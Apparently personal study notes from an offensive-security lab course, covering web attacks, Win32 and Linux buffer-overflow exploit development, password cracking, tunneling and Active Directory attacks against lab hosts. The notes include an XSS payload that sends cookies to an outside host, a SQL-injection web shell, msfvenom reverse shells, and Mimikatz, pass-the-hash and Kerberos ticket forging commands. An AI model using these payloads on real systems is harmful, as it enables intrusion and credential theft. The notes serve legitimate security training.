#### 2 - Scanning & Enumeration
Port scanning with Nmap:
	nmap -T4 -p- 192.168.1.254 (then up arrow to check status)
	nmap -T4 -p- -Pn 192.168.1.254 (-Pn if we know the machine does not respond to ICMP)
	nmap -T4 -A -p53,80,111,443,514 192.168.1.254
	nmap -sU -T4 192.168.1.254 (it scans only the top 1000 ports. Scanning all ports with -p- would take hours and scanning UDP is unreliable)
	/usr/share/nmap/scripts

##### Web Application Attacks
Web application enumeration (passive enumeration):
	Inspecting URLs with Firefox"s developer tools
	Inspecting page content (source code and resources) with Firefox"s debugger, including the Pretty-print button and Inspector
	Viewing response headers (servers' responses) with a proxy and Firefox"s Network tool. Servers' headers often reveal the Web server name and version.
	Inspecting sitemaps like robots.txt and sitemap.xml (for example with: curl https://www.google.com/robots.txt)
	Locating administration consoles on standard URLs and ports
Web application assessment tools (active enumeration):
	DIRB (Web content scanner using wordlists to identify pages and directories): dirb http://www.megacorpone.com -r -z 10
	Burp Suite: update to latest version, regenerate CA cert and import it in Firefox
	Nikto, a Web server scanner. Nikto is very loud and can be slow. For example: nikto -host=http://www.megacorpone.com -maxtime=30s
Exploiting Admin consoles:
	DIRB + Burp Intruder
Cross-site scripting (XSS):
	<script>alert("XSS")</script>
	<iframe src=http://10.11.0.4/clientsideattack height="0" width="0"></iframe>
	Steal cookie/sessionid: <script>new Image().src="http://10.11.0.4/cool.jpg?output=" + document.cookie;</script>
Directory traversal vulnerabilities
File inclusion vulnerabilities (local or LFI / remote or RFI)
PHP Wrappers: 10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir")>
SQL injection:
	Identifying SQL injection vulnerabilities: pass a single quote to an input form and see if we get back an error from the backend database
	Authentication bypass: select * from users where name = 'tom' or 1 = 1;#' and password = 'jones'
	If the application throws an error if multimple records are returned, we can use the following: select * from users where name = 'tom' or 1 = 1 LIMIT 1;#
	Enumerating the database: 10.11.0.22/debug.php?id='
	Column number enumeration (trial and error approach): 
		10.11.0.22/debug.php?id=1 order by 1
		10.11.0.22/debug.php?id=1 order by 2
		etc.
		to automated with Burp
	Extracting data from the database with union statements:
		10.11.0.22/debug.php?id=1 union all select 1, 2, 3
		display MariaDB version: 10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
		display the MariaDB database user: 10.11.0.22/debug.php?id=1 union all select 1, 2, user()
		display the layout of the database: 10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
		display the column names of the users table: 10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
		display the username and password columns from the users table: 10.11.0.22/debug.php?id=1 union all select 1, username, password from users
	From SQL injection to code execution:
		Read a file with the "load_file" function: 10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System/drivers/etc/hosts')
		Use the "into OUTFILE" to create a malicious php file in the Web root: 10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo '<pre> . shell_exec($_GET['cmd']) . '</pre>', ?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
		Then pass a command to the newly created backdoor.php file: 10.11.0.22/backdoor.php?cmd=ipconfig
	Automatic SQL injection:
		Test if there is SQL injection to exploit with sqlmap: sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
		Automate the extraction of data with sqlmap: sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
		Upload and execute a remote shell with sqlmap: sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell 

##### Win32 buffer overflows
How to identify buffer overflows:
	Source code review
	Fuzzing
Process of discovering and exploiting a buffer overflow vulnerability as an attacker:
	Discover the buffer overflow vulnerability without access to the source code of the application
	Craft our input in such a way that it grants us control of critical CPU register
	Manipulate memrory to get reliable remote code execution
x86 architecture:
	Windows process memory (lower to higher memory addresses):
		0c00000000
								Stack
								Program Image
		0x00400000		Process Environment Block (PEB)
								Thread Environment Block (TEB)
		0x7FFDF000		Dynamic Link Library (DLL)
		0x7FFFFFFF
		0xFFFFFFFF 		Kernel Memory Space
	We will only focus on the Stack.
	When a thread is running, it executes code from either the Progam Image or one or multiple DLLs loaded by the application, The thread requires a short term date area, for functions, local variables and program control information. This data area is known as the Stack. Each trhead in a running application has its own Stack. The Stack is seen by the CPU as a LIFO data structture. The x86 architecture implements specific PUSH and POP assembly instructions to add/remove data from the stack. 
	Function return address is the address to return to when the function completes. This return address (together with the function's arguments and local variables) is stored on the Stack and associated with one function call and is store in a section of the Stack memory called Stack Frame.
	CPU registers: 
		x86 CPUs have 9 32-bit registers (small and extreme high speed CPU storage locations)
		General Purpose Registers:
			EAX - the Accumulator
			EBX - the Base Pointer
			ECX - the Count register
			EDX - the I/O port addressing, multiplication and division register
			ESI - the Source Index (pointer to the data source in string copy operations)
			EDI - the Destination Index (pointer to the destination memory buffer in string copy operations)
		ESP - the Stack Pointer (the most recently referenced location on the Stack)
		EBP - the Base Pointer (pointer to the top of the Stack when a function is called, so that a function can easily reference its own stack frame via offset while executing)
		EIP - the Instruction Pointer (is the most important register for our purposes, since it points to the next code instruction to be executed, which is the key piece of information to control when performing a buffer overflow)
Win32 buffer overflow exploitation::
	Fuzzing the HTTP protocol:
		Sync Breeze 10.0.28 is vulnerable to pre-authentication buffer overflow using the username field
		First we will sample the network traffic generated by an unsuccessful login attempt on Sync Breeze Web interface with Wireshark  
		We build a python fuzzer to send a series of HTTP POST login requests with increasingly longer username values
		Identify which Sync Breeze process is listening on TCP port 80 with Windows TCPView to attach Immunity Debugger to
		Run the python fuzzer and see that Sync Breeze crashes once the username lenght is around 800 bytes
	Replicating the crash:
		With python fuzzer and fixed username buffer lenght (800 bytes)
	Controlling EIP:
		We need to identify which part of the buffer ends up ovewriting the 4 bytes of the EIP 
		msf-patter_create -l 800
		We update the username buffer of the python fuzzer with the buffer generated with metasploit 
		We run the fuzzer again and we find out that EIP has been overwritten with the 4 bytes 42306142 = B0aB
		msf-pattern_offset -l 800 -q 42306142
		We find that these 4 bytes are at lenght 780 of the username buffer
		We then update the python fuzzer to use a username buffer composed of 780 As, 4 Bs and 16 Cs (16 Cs to fill the original 800 bytes buffer lenght proven to crash Sync Breeze reliably)
	Locating space for our shellcode:
		At this point we can control the EIP content, but first we need to identify to which address point the EIP (i.e. the address of our shellcode of choice)
		ESP seems a convenient location for our shellcode, but we need to increase our username buffer lenght (for example from 800 to 1500 bytes, as in 780 As, 4 Bs, 16 Cs and 700 Ds), since a reverse shell shellcode is usually 350 to 400 bytes in size
		We run the python fuzzer again and we find that this new username buffer gives us more than 700 bytes of free space for our shellcode
	Checking for bad characters:
		These are characters that will make the shellcose 
		An example is the null byte 0x00 (which is used to terminate a string in low level languages)
		Another often bad character is the rerutn character 0x0D, which signify the end of an HTTP field, in our case the username 
		The most comon way to idenfy bad chars is to send all possible chars (from 0x00 to 0xFF) as part of our buffer to the application and see how these chars are handled by the application
		To do this, we change the username buffer of the python fuzzer accordingly (we populate the username buffer with a string containing ALL possible chars), we crash Sync Breeze and we "Follow in Dump" the ESP
		From the HEX dump we find that the character 0x0A is not present (0x0A is the Line Feed character, which also breaks HTML like a carriage return 0x0D), we remove it from the username buffer of the python fuzzer and we run it again
		At the next iteration, we find out that 0x0D is also bad, which was expected, knowing that 0x0D is a carriage return and breaks HTML
		Running the python fuzzer recursively and taking out one by one all the bad chars that we identify, we came to the conclusion that in our Sync Breeze scenario, all the following are bad chars: 0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, 0x3D
	Redirecting the execution flow (finding the return address):
		The most intuitive approach is the replace the Bs (EIP) with the address of the ESP at the time of the crash, however we see that the ESP value is changing from crash to crash (since each thread has a different stack region in memory allocated by the operating system), thus overwriting the EIP with the ESP address is not a reliable solution
		The solution is to use the JMP ESP instruction (or its memory address), which is a way to dynamically and reliably point the execution flow (the EIP) to the ESP address, thus our shellcode
		We need to find a reliable and static JMP ESP instruction. JMP ESP is a very common instruction, found in several Windows libraries. However, we cannot use libraries compiled with ASLR support, since in these the memory addresses are not static
		Also, we need to find a JMP ESP instruction not only static, but whose address does not contain any of the bad chars identified prior
		We use the Immunity Debugger mona modules (!mona modules) to navigate all the libraries (DLLs) used by the Sync Breeze executable
		We find that the Sync Breeze executable has all the memory protection schemes disabled (which is good), but its address is 00400000, which are all bad chars (thus not good). We need to look further
		Searching further, we find that libspp.dll suits our needs in terms of memory protection not used and address with no bad chars in it
		Now we need to find a naturally occurring JMP ESP instruction within the libspp.dll. We can perform this search with !mona find
		To find the opcode of a JMP ESP instruction, we can use the msf-nasm_shell and type "jmp esp" once in the nasm shell. We find that the opcode for JMP ESP is FFE4
		We can now search for a JMP ESP instruction within libspp.dll with the !mona find command and passing the HEX representation of the JMP ESP opcode: !mona find -s "\xff\xe4" -m "libspp.dll". This command gives us the result of the 0x10090c83 address for a JMP ESP instruction in libspp.dll and, fortunately, this address does not contain any of the bad chars for Sync Breeze. This is our "return address"
		We update the python fuzzer with the return address just found in place of the 4 Bs (but in reverse order "\x83\x0c\x09\x10", due to the Little Endian byte order of Win32 systems, where the low order byte of the number is stored in memory at the lowest address and the high order byte is stored at the highest memory address, thus the reverse order of the return address for the CPU to interpret it correctly)
	Generating shellcode with metaploit:
		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c 
		This command gives us a shellcode that contains bad chars. We need then to encode the shellcode and instruct msfvenom not to use any of the bad chars
		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" 
	Getting a shell:
		We add the generated shellcode to our username buffer in the python fuzzer after the filler, EIP and offset
		However, because the shellcode is encoded, it is not directly executable and is pre-pended by a decoder stub
		The job of the stub is to iterate over the encoded shellcode bytes and decode them back to their original executable format
		In order to perform this task the decoder needs to gather its address in    memory and from there look at few bytes ahead to locate the encoded shellcode that it needs to decode
		As part of the process of gathering the decoder stub location in memory, the code performs a sequence of assemby instructions, which are commonly referred to as a GetPC routine. This is a short routine that moves the value of the EIP register (sometimes referred to as the Program Counter, or PC) into another register. As with other GetPC routines, those used by shikata_ga_nai have an unfortunate side effect of writing some data at and around the top of the Stack. This eventually mangles at least a couple of bytes close to the address pointed to by the ESP register, which leads to an access violation caused by the decoder (the GetPC routine corrupts the decoder, which fails to decode the shellcode and the shellcode triggers the access violation)
		To prevent this problem to occur, we can create a wide landing pad to our JMP ESP, such that when execution lands anywhere on this pad, it will continue on to our payload. We simply precede our payload with a series of "no operation" or nop instructions ("\x90"), which do nothing else than pass execution to the next instruction. These instructions are known as "nop sled" or "nop slide"
		We add 10 nops immediately before our shellcode in the python fuzzer (the username buffer will then be as follows: buffer = filler + eip + offset + nops + shellcode)  
		Now the exploit is working as expected and a reverse shell is sent to the attacker machine on port 443
		However the exploit crashes Sync Breeze once the attacker closes the reverse shell. We can try to avoid the crash using the ExitThread api, instead of the ExitProcess api used by the metasploit reverse shell. This will alow us to run the exploit without interrupting the norml operations of the Sync Breeze server
		To instruct msfvenom to use the ExitThread function instead of the ExitProcess, we can use the following syntax: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" 
		Let"s replace the shellcode and verify that exiting the reverse shell will not crash Sync Breeze. BINGO!

##### Linux buffer overflows
Crossfire 1.9.0 is vullnerable to a network-based buffer overflow when passing a string of more than 2000 bytes to the setup sound command. 
We will study this buffer overflow with evans debugger to debug Crossfire
Memory protection mechanisms on Linux kernels and compilers:
	DEP: Data Execution Prevention
	ASLR: Address Space Layout Randomization
	Canaries: Stack Canaries
Since the bypass of these protection mechanisms is beyond the scope of studying this buffer overflow, the Crossfire executable we will work on has not been compiled with these mechanisms enabled
Replicating the crash: 
	We create the proof of concept python exploit code from information publicly available on the Internet
	A buffer of 4379 byte is proven to crash the application
Controlling the EIP:
msf-pattern_create -l 4379
	We update the python poc and run it again against Crossfire and we find with edb that the EIP has been overwritten with the following bytes: 46367046
	With msf-pattern_offset -q 46367046 we find that those byte are at offse 4368 of the buffer. We update then again the python poc and we verify our control of the EIP
Locating space for our shellcode:
	The ESP points to the end of our buffer, but it only gives us 7 bytes for our shellcode, which is not enough
	Also, we cannot incrase the size of the buffer since, if we do it, we see that Crossfire starts crashing in an unpredictable way, not good for us
	We find that EAX points to the beginning of our buffer, including the "setup sound" command
	What we can try to do is to use the 7 bytes pointed by ESP to inject first stage shellcode. This fist stage payload will be used to align the EAX register in order to make it point to our buffer right after the setup sound string and then to jump to that location, skipping the first undesired instructions.
	In order to achieve this, our first stage shellcode will need to increase the value of EAX by 12 bytes, as there are 12 characters in the string "setup sound"
	We can accomplish this with an ADD assembly instruction and then jump to the memory pointed to by EAX with a JMP instruction. In order to get the orrect opcode for these instructions, we can use the nasm shell utility provided by metasploit: 
		msf-nasm_shell
		nasm > add eax, 12
		00000000 	83C00C 		add eax, byte +0xc
		nasm > jmp eax 
		00000000 	FFE0 		jmp eax
	Luckily for us, these two instructions only take 5 bytes of memory.
	We update our python poc by including the first stage shellcode and repadding the original buffer with nops, in order to maintain the correct lenght.
	Our updated poc code is working perfectly: the EIP is overwritten with 4 Bs and our first stage shellcode is located at the memory address pointed to by the ESP register
Checking for bad characters:
	To find the list of bad characters for the Crossfire application, we send to it the complete set of characters (from 0x00 to 0xFF) and see if any of these bytes get changed, mangled, swapped or dropped by the application. This process is identical to the one followed during the development of a buffer overflow exploit under Windows. After doing that, we arrive to the conclusion that only \x00 and \x20 are bad characters for the Crossfire application 
Finding a return address:
	As a final step, we need to find a valid assembly instruction to redirect code execution to the memory location pointed to by the ESP register
	edb comes with a set of plugins, once of which is called "Opcode Searcher"
	Using this plugin we can easily search for a JUMP ESP instruction in the memory region where the code section of the Crossfire application is mapped. We proceed with the first JMP ESP instruction found by the debugger
	We can now update our python poc with the return address and run it. Indeed, we see that we land at our first stage shellcode, first stage that aligns the EAX with the dedired return address and then with the JMP EAX we land at our clean buffer of As. The only thing left to do is to insert a shellcode into out buffer of As
Getting a shell:
	All we need to do now is to generate a reverse shell payload with msfvenom and drop it at the beginning of our buffer of As
	msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode
	We now setup our local nc listener on port 443 and se send our exploit... BINGO!

##### Client-side Attacks
These attack vectors are particularly appealing for an attacker who does not have routable access to the victim's machine
Client-side attacks may require:
	Passive information gathering
	Active information gathering 
	Social engineering
	Client fingerprinting (for example with the fingerprintjs2 project on github)
Exploiting HTML applications:
	This attack vector (application file extension .hta) allows to write malicious HTML code and have it run on the victim machine outside of the security context of the victim's browser (for example enabling ActiveX and even more powerful PowerShell commands)
Microsoft Office applications
	Microsoft Word Macro
	Object linking and embedding (.bat files)
	Evading Protected View (if Microsoft Publisher is installed, since Publisher does not enable Protected View by default like Word or Excel)

##### Working With Public Exploits
Online exploit resources:
	exploit-db.com 
	securityfocus.com
	packetstormsecurity.com
	google search operators
	"MIcrosoft Edge site:exploit-db.com"
	"MIcrosoft Edge site:exploit-db.com inurl:exploits"
	"MIcrosoft Edge site:exploit-db.com inurl:exploits intext:remote"
	"MIcrosoft Edge site:exploit-db.com inurl:exploits intext:remote intitle:browser"
Offline exploit resources (within kali):
	SearchSploit (/usr/share/exploitdb)
	As an example: searchsploit remote smb microsoft windows
	Nmap NSE scripts:
	 cd /urs/share/nmap/scripts
	grep Exploits *.nse
	Browser Exploitation Framework (BeEF):
		Launch the framework: sudo beef-xss
		Login via Web browser at: 127.0.0.1:3000/ui/panel
		Next step is to hook the victim"s browser
	Metasploit framework:
		To start the console: sudo msfconsole -q
		To list all exploits related to XXX vulnerability: search -h 

##### Fixing Existing Exploits
Fixing memory corruption exploits:
	Change parameters
	Change payload whenever possible (do not trust original payloads)
	Eventually cross-compile with mingw-w64: i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
	Launch Windows exploits from kali with wine: wine syncbreeze_exploit.exe
Fixing Web application exploits:	
	Usually easier to re-purpose than native exploits (no need for compilation for example)

##### Password Attacks
Standard wordlists:
	/usr/shared/wordlists
Custom wordlists:
	cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
Password profiling and password enforcement policies with John the Ripper:
	nano /etc/john/john.conf
	john --wordlist=megacorp-cewl.tx --rules --stdout > mutated.txt
Bruteforce password attacks:
	Bruteforce attacks can be very time consuming, very loud and not realistically viable, but they may make sense in case we know that the password for a certain user or organization follows a very specific pattern and enforcement policies. In this case we can generate our own ad-hoc bruteforce wordlist with crunch
	crunch wordlist generator: crunch 8 8 -t ,@@^^%%%
Common Network Service Attack Methods:
	HTTP htaccess attack with Medusa:
		sudo gunzip /usr/share/wordlists/rockyou.txt.gz
		medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rokyou.txt -M htttp -m DIR:/admin
	Remote desktop protocol attack with Crowbar, a network authentication cracking tool:
		Crowbar is one of the few tools to perform password attacks against the RDP service on modern versions of Windows
		sudo apt-get install crowar 
		crowbar -b rdp -s 10.11.0.22/32 -u admin -C password-file.txt -n 1
	SSH attack with THC-Hydra:
		It can be used best to attach SSH and HTTP
		hydra -l kali -P password-file.txt ssh://127.0.0.1
	HTTP POST attack with THC-Hydra:
		hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^ : INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou,txt -vV -f
Leveraging password hashes:
	Hash type identification: hashid blablabla
	Users" hashes:
		Linus: /etc/shadow
		Windows: SAM (Security Accounts Manager)
			LM hashes: not salted, weak and breakable with hash lookup attach
			NTLM hash: more secure, but still not salted
			The SAM database cannot be copied while the operating system is running. However, we can use Mimikatz against the lsass service:
				c:\tools\password_attacks\mimikatz.exe
				[mimikatz] privilege::debug
				[mimikatz] token::elevate
				[mimikatz] lsadump::sam
Passing the hash in Windows:
	Passing the hashes in Windows (i.e. authenticating on multiple systems/services with username/hash instead of username/password) is possible because LM and NTLM hashes are not salted and hashes remain static over time
	passing-the-hash toolkit performs authentication via the SMB protocol:
	pth-winexe -U username%blablablahash //10.11.0.22 cmd
	NTLM hashes are passed over the network in the form of Net-NTLM hashes
Windows password cracking:
	If hashes are NOT salted, cracking is possible
	If hashes are salted, cracking is very very difficult, if not impossible
	In many real world scenarios, it is possible to capture both salt values and hashes to pass to the cracking sotfware (i.e. John the Ripper)
	John the Ripper:
		Pure brute force of every possible password: john hash.txt --format=NT
		Using a wordlist: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
		Using word mangling rules from /etc/john/john.conf: john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
Linux password cracking:
	sudo grep victim /etc/passwd > passwd-file.txt
	sudo grep victim /etc/shadow > shadow-file.txt
	unshadow passwd-file.txt shadow-file.txt > unshadowed-file.txt
	john --rules --wordlist=usr/share/wordlists/rockyou.txt unshadowed-file.txt

##### Port Redirection And Tuneling
Port forwarding with RINETD:
	sudo apt-get install rinetd
	sudo nano /etc/rinetd.conf
	Add the forwarding rules to redirect all incoming traffic on port 80 to google.com (IP 216.58.207.142) on port 80: 0.0.0.0 80 216.58.207.142 80
	sudo service rinetd restart
	ss -antp | grep "80"
SSH tunneling:
	SSH can create encrypted tunnels
	SSH local port forwarding: 
		It allows to tunnel a local port to a remote server using SSH as transport protocol, similarly to RINETD, with few twists
		On kali attacker machine: sudo ssh -N -L  [bind_address:]port:host:hostport [username@address]
		On kali attacker machine: sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
		On kali attacker machine: smbclient -L 127.0.0.1 -U Administrator
	SSH remote port forwarding:
		It is the reverse of local port forwarding, because a port is open on the remote side of the connection and traffic sent to that port is forwarded to a port on our local attacker machine, where we run ssh command
		On the debian client: sudo ssh -N -R [bind_address:]port:host:hostport [username@address]
		On the debian client: sudo ssh -N -R 10.11.0.4:2221:127.0.0.1:3396 kali@10.11.0.4
		On kali attacker machine: ss -antp | grep "2221"
		On kali attacker machine: sudo nmap -sS -sV 127.0.0.1 -p 2221
	SSH dynamic port forwarding:
		it allows us to set a local listening port and have it tunnel incoming traffic to any remote destination thru the use of a proxy
		On kali attacker machine: ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
		On kali attacker machine: sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
		This basically creates a socks4 proxy on port 8080. To have our kali tools use this proxy, we can use proxychains and edit its config file
		sudo nano /etc/proxychains.conf
		We add our socks4 proxy to the config file: socks4 127.0.0.1 8080
		Then, we can run our tools thru this proxy, we prepend our commands with proxychains, for example: proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
PLINK.exe:
	It is used to pivoting thru Windows operating systems (we need a System level shell). For example, we can exploit the SyncBreeze buffer overflow and gain System level access to the Windows machine. After enumerating the machine, we find a MySQL server running on the machine, but we cannot interact with it directly from our attacker kali machine because the firewall blocks port 3306
	PLINK.exe is a Windows-based command line SSH client
	To establish remote port forwarding: cmd.exe /c echo y | plink.exe -ssh-l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
NETSH:
	netsh can be used on a Windows system (for example our Windows client), where there is the IP Helper service running and the network interface has IPv6 support enabled. Fortunately both are enabled by default on Windows. We can then use netsh to forward the SMB port 445 of a Windows server in the internal network to the port 4455 of the Windows client, so that we can then access with it from our attacker kali machine
	netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
	To verify the new listening port: netstat -ant TCP | find "4455"
	To add a firewall rule and allow incoming traffic on port 4455, being 455 blocked by default by the firewall: netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
	To test the port forwarding: smbclient -L 10.11.0.22 --port=4455 --user=Administrator
	Finally we can mount the share of the internal Windows server:
	sudo mkdir /mnt/win10_share
	sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
HTTPTunneling through deep packet inspection:
	httptunnel is an tool useful in environments where some protocols are not allowed, for example environments where SSH is not allowed and where all SSH-based tunnels will not work. For example, we want to establish a RDP connection between our attacker kali machine and the Windows server in the internal network, via the debian client and with the firewall that only allows ports 80, 443 and 1234
	
	httptunnel works on a client-server based way (hts being the server and htc the client components) and needs to be installed in kali: sudo apt update && sudo apt install httptunnel
	From the debian client: ssh -L 0.0.0.0:8888:192.168.1.110:3389student@127.0.0.1
	Then we setup the httptunnel server on the debian client: hts --forward-port localhost:8888 1234
	Finally we setup the httptunnel client on our attacker kali machine: htc --forward-port 8080 10.11.0.128:1234
	At this point we can launch the RDP client against port 8080 of the kali machine and connect, thru the HTTP tunnel, bypassing firewall restrictions and using the ssh local port forwarding of the debian machine, to our final target that is the Windows server: rdesktop 127.0.0.1:8080

##### Active Directory Attacks
WADComs  - interactive cheat sheet for Windows/AD environments: https://wadcoms.github.io/
The following scenario assumes that we were able to compromise the Windows client and get local admin level access on it
Active Directory enumeration:
	The traditional approach:
		To enumerate all local accounts: net user
		Enumerate all users in the entire domain: net user /domain
		Show info on a particular user: net user jeff_admin /domain
		Enumerate all groups in the domain: net group /domain
		However, a big limitation of net.exe is that it cannot unravel nested gropus 
	A modern approach:
		We can leverage PowerShell to create a script (enumerateAD.ps1) that will enumerate all the users in the domain and their properties via a DirectorySearcher object, which uses LDAP (a network protocol understood by domain conrollers)
		To get the hostname and distinguished name of the domain controller: [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		If we now execute the PowerShell script (with .enumerateAD.ps1), we find the full LDAP provider path: LDAP://DC01.corp.com/DC=corp,DC=com
		Now, we expand the script to enumerateAD2.ps1. When run (with ./enumerateAD2.ps1), the script enumerates all the users in the domain
		To narrow down our search, we cna use filter to restrict the search to particular user groups, for example Domain Admins, or to specific usernames, for example Jeff_Admin: ./enumerateAD3.ps1
		This PowerShell script is very flexible and can be used to numerate many more aspects of Active Directory
	Resolving nested groups:
		Let"s expand our script to look into the nested groups: ./enumerateAD4.ps1
	Currently logged in users:
		To list currently logged on users, we can try to use two Windows APIs, called NetWkstaUserEnum (to invoke against workstations) and NetSessionEnum (to invoke against domain controllers)
		To invoke NetWkstaUserEnum, we can use the PowerView script from PowerShell Empire, but the tool need to be already on the machine:
			cd C:\Tools\active_directory
			Import-Module .\PowerView.ps1
			Get-NetLoggedon -ComputerName client251
		Next, let's try to enumerate active sessions to a domain controller (i.e. DC01), invoking NetSessionEnum:
			Get-NetSession -ComputerName dc01
	Enumeration Through Service Principal Names:
		Pre-define service accounts LocalSystem, LocalService, NetworkService
		When applications such as IIS, Exchange or SQL are integrated with AD, a unique service instance identifier, known as Service Principal Name (SPN), is used to associate a service on a specific service to a service account on AD. By enumerating SPNs, we can find IP addresses and port of services on various servers which are integrated with AD. We will query the domain controller for SPNs with a new version of our script:
			.\enumerateAD5.ps1
Active Directory authentication:
	AD supports two authentication methods: NTLM or Kerberos (default)
	NTLM authentication:
		It is a 7 steps process
	Kerberos authentication
		It uses a ticket system
		The domain controller acts as key distribution center (KDC)
	Cached credential storage and retieval:
		Password hashes for Kerberos are saved on the Local Security Authority Subsystem Service (LSASS)
		We need Local Admin to access LSASS and LSASS is encrypted
		Mimikatz can be used to try to access LSASS and extract password hashes for all logged on users:
			mimikatz # privilege::debug
			mimikatz # sekurlsa::logonpasswords
		We can now try to crack the hashes or use mimikatz to exploit the TGT and service tickets:
			mimikatz # sekurlsa::tickets 
			mimikatz is worth exploring more given its many functionalities
	Service Account Attacks:
		We will abuse the Service Ticket and attempt to crack the password of the Service Account, exporting the hashes to our Kali machine to attempt cracking them (attack calle Kerberoasting):
			From PowerShell: Add-Type -AssemblyName Syste,.IdentityModel New-Object 
			From PowerShell: System,.IdentityModel.Tokens.KerberosRequestorSecurityTocken -ArgumentList 'HTTP/CorpWebServer.corp.com'
			From PowerShell: klist
			With mimikatz we export the hashes to the disk of the server: mimikatz # kerberos::list /export
			We then transfer the hashes to our Kali attacker machine for example to the location: /ftphome/1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
			We install kereroast on our Kali machine: sudo apt-get update && sudo apt-get install kerberoast
			Finally, to crack the hash from Kali attacker machine: python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt /ftphome/1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
	Low and slow password guessing:
		Some domain account policies have account lock outs that may be triggered by brute force or wordlist cracking attacks
		To perform such attack, we first look at the domain account policies and in particular at the "Lockout threshold" and "lockout duration": net accounts
		We can use our PowerShell script to implement our attack: ./enumerateAD6.ps1
		The output will be different in the case the password provided is correct or incorrect and the consequent output will be different (success in case the password is correct. an exception in case it is not correct)
		We can then create a powershell script that will perform this check at a certain brute force rate, based on the lock out period we discovered earlier
Active Directory Lateral Movement:
	Pass the hash:
		It only works on services that use NTLM, not Kerberos
		Let"s see an example of pass the hash attack using the pth-winexe executable from the Pass-the-Hash toolkit: 
			pth-winexe -U offsec%blablantlmhash //10.11.0.22 cmd 
	Overpass the hash:	
		It allows to overabuse a NTLM user hash to get a Kerberos TGT (Service TIcket) that authenticates us access to another machine or service as that user
		First of all, we dump the hashes with mimikatz: mimikatz # sekurls a::logonpasswords
		Then, we need to turn the NTLM hash into a Kerberos ticket...
		We can use again mimikatz to create a PowerShell console run with the privelege of user jeff_admin: mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:blablantlmhash /run:PowerShell.exe
		Within this PowerShell, let us authenticate to a network share on the domain controller in order to generate a TGT: net use \\dc01
		Now we list the cached Kerberos tickets with klist: klist
		And we find the newly requested Kerberos tickets, which includes the TGT and the TGS
		We can use the obtainet TGT with psexec, which does not accept password hashes, but only TGTs. With the following command, we obtain a shell with privelege of user jeff_admin on the domain controller dc01: .\PsExec.exe \\dc01 cmd.exe
	Pass the ticket (Silver Ticket):
		This attack takes advantage of the TGS, which can be exported and reinjected in other machines on the network and then used to authenticate to specific services with no additional authenticatio required if the TGS is in the name of the same user who is trying to authenticate to the server. This attack does not give us additional privilege, but it gives us the flexibility to decide from which machine on the network originate the athentication (not possible in the case of overpassing the hashes). This attack is known as Silver Ticket and we can use mimikatz to create the Silver Ticket.
			First, we need to find the domain SID: whoami /user
			From the user SID output of the whoami /user we need to eliminate the last 4 digits to find the domain SID
			Before creating a new ticket, we flush all existing Kerberos tockets with the command: mimikatz # kerberos::purge
			We verify the purge with the command: mimikatz # kerberos::list
			Finally, to create the Silver Ticket with mimilatz (to note that the flag /ptt means that mimikats inject the Silver Ticket directly in memory): mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:blabladomainsid /target:CorpWebServer.corp.com /service:HTTP /rc4:blablablapasswordhashofhteserviceaccount /ptt
			We can confirm the ticket has been successfully created running again: mimikatz # kerberos::list
Active Directory Persistence:
	Golden Tickets:
		In Kerberos, when a user submits a request for a TGT, the Key Distribution Center (KDC) encrypts the TGT with a secret key, known only to the KDCs in the domain. This secret key is the password hash of a domain user account called krbtgt. If we can get hold of the krbtgt, we can create our own self made TGTs, or Golden Tickets.
		Golden Tickets are the best way to achieve AD persistence.
		The best advantage is that the krbtgt account password is not automatically changed. 
		To exploit this technique, we need to assume we have got Domain Admin access in the network or compromised the Domain Controller itself. With such access, we can extract the password hash of the krbtgt account with mimikatz:
			mimikatz # privilege:debug
			mimikatz # lsadump::lsa /patch
		To create the Golden Ticket, we do not necessarily need to be on the Domain Controller, but any workstation can do that:
			mimikatz # privilege:debug
			mimikatz # kerberos::purge
